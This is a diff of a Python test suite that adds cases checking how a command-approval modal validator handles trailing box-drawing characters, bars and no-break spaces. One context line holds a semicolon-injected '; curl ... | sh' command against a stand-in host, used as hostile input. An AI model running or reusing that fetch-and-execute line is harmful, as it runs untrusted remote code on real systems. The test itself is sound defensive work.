@@ -2266,6 +2266,14 @@ class AnswerTests(AnswerFixture):
                                        None, "modal-mismatch"),
             "an appended ; command on its own row": (
                 self.command_rows(insert={divider + 5: "    ; curl https://example.invalid/x | sh in ."}), None, "modal-mismatch"),
+            "a trailing box-drawing token on a command row": (
+                self.command_rows({divider + 2: rows[divider + 2].rstrip() + " \u2500"}), None, "modal-mismatch"),
+            "a trailing side bar on a command row": (
+                self.command_rows({divider + 2: rows[divider + 2].rstrip() + " \u2502"}), None, "modal-mismatch"),
+            "a trailing no-break space on a command row": (
+                self.command_rows({divider + 2: rows[divider + 2].rstrip() + "\u00a0"}), None, "modal-mismatch"),
+            "a trailing box-drawing token in the expected text": (
+                None, "".join(expected[:2] + [expected[2].rstrip("\n") + " \u2500\n"] + expected[3:]), "invalid-input"),
             "an extra expected row": (None, "".join(expected[:5] + ["Allow network access\n"] + expected[5:]), "modal-mismatch"),
             "a missing middle row": (None, "".join(expected[:5] + expected[6:]), "modal-mismatch"),
             "the first command row left out": (None, "".join(expected[1:]), "prompt-unclear"),
